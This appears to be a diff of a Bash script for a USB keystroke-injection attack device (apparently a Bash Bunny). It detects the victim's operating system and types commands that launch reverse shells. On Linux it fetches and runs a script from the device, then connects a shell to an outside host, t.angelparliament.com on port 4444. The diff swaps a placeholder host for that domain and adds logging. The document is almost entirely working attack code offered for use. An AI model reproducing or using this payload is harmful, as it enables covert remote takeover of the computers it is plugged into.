@@ -1,25 +1,28 @@
 #!/bin/bash
-ATTACKMODE HID AUTO_ETHERNET
-python -m SimpleHTTPServer > /dev/null 2>&1 &
-GET TARGET_OS
 GET SWITCH_POSITION
-RHOST=example.com
-RPORT=1337
+echo 'Payload Started' >> /root/udisk/payloads/$SWITCH_POSITION/payload.log
+ATTACKMODE HID AUTO_ETHERNET
+LED B
+sleep 5
+python -m SimpleHTTPServer > /root/udisk/payloads/$SWITCH_POSITION/payload.log 2>&1 &
+echo 'Web Server Started' >> /root/udisk/payloads/$SWITCH_POSITION/payload.log
+GET TARGET_OS
+echo $TARGET_OS >> /root/udisk/payloads/$SWITCH_POSITION/payload.log
+LED ATTACK
 case "$TARGET_OS" in
 	WINDOWS)
-		LED R
 		if [ -f "/root/udisk/payloads/${SWITCH_POSITION}/windows.txt" ]; then
         	Q /root/udisk/payloads/${SWITCH_POSITION}/windows.txt
+        	echo 'Windows Reverse Shell Executed' >> /root/udisk/payloads/$SWITCH_POSITION/payload.log
 	MACOS)
-		LED G
 		if [ -f "/root/udisk/payloads/${SWITCH_POSITION}/mac.txt" ]; then
         	Q /root/udisk/payloads/${SWITCH_POSITION}/mac.txt
+        	echo 'Mac Reverse Shell Executed' >> /root/udisk/payloads/$SWITCH_POSITION/payload.log
 	LINUX)
-		LED B
-		Q ALT F2
-		sleep 1
-		LED STAGE1
-		Q STRING "curl http://172.16.64.1:8000/a.sh > ~/a.sh && chmod +x ~/a.sh && ~/a.sh $RHOST $RPORT && exit"
+		Q CTRL-ALT t
+		sleep 2
+		Q STRING "curl http://172.16.64.1:8000/a.sh > ~/a.sh && chmod +x ~/a.sh && ~/a.sh t.angelparliament.com 4444"
 		Q ENTER
+		echo 'Linux Reverse Shell Executed' >> /root/udisk/payloads/$SWITCH_POSITION/payload.log
 esac
 LED FINISH
